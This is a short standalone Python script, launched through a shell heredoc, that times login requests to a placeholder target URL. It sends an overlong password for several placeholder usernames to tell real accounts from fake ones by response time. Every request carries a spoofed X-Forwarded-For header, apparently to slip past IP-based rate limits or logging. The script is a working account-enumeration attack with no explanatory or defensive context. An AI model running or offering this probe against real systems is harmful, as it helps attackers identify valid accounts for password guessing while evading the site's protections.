python3 - <<'EOF'
import requests
import time

base_url = "REPLACE_WITH_TARGET_URL"
long_pass = "A" * 100

for username in ["REPLACE_WITH_KNOWN_FAKE_USERNAME", "REPLACE_WITH_YOUR_OWN_TEST_ACCOUNT", "REPLACE_WITH_CANDIDATE_USERNAME"]:
    start = time.time()
    r = requests.post(
        f"{base_url}/login",
        data={"username": username, "password": long_pass},
        headers={"X-Forwarded-For": "1.2.3.4"},
    )
    elapsed = time.time() - start
    print(f"{username} → {elapsed:.3f}s | {r.status_code}")
EOF
